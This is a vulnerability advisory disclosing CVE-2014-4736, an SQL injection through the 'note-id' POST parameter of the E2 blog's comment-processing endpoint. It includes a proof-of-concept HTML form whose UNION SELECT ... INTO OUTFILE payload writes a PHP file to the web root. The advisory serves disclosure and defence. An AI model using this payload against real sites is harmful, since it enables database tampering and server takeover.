Advisory Details:

High-Tech Bridge Security Research Lab discovered SQL injection vulnerability in Е2, which can be exploited to perform SQL injection attacks and gain control over the vulnerable application.


1) SQL Injection in Е2: CVE-2014-4736

The vlnerability exists due to insufficient sanitization of input data passed via the "note-id" HTTP POST parameter to "/@...ions/comment-process" URI. A remote attacker can send a specially crafted HTTP POST request, inject and execute arbitrary SQL commands in application’s database. Successful exploitation of the vulnerability may allow an attacker to add, modify or delete arbitrary records in database and gain complete access to the web site.

PoC code below will create a PHP file "/var/www/file.php", containing "phpinfo()" call (if the filesystem permissions and MySQL configuration allow it):


<form action="http://[host]/@...ions/comment-process" method="post" name="main">
<input type="hidden" name="already-subscribed" value="">
<input type="hidden" name="comment-id" value="new">
<input type="hidden" name="elton-john" value="1">
<input type="hidden" name="email" value="mail@...l.com">
<input type="hidden" name="from" value="">
<input type="hidden" name="name" value="name">
<input type="hidden" name="subscribe" value="on">
<input type="hidden" name="text" value="1">
<input type="hidden" name="note-id" value="' UNION SELECT '<? phpinfo(); ?>',2,3,4,5,1,7,8,9,10,11,12,13,14,15 INTO OUTFILE '/var/www/file.php' -- 2">
<input type="submit" id="btn">
</form>
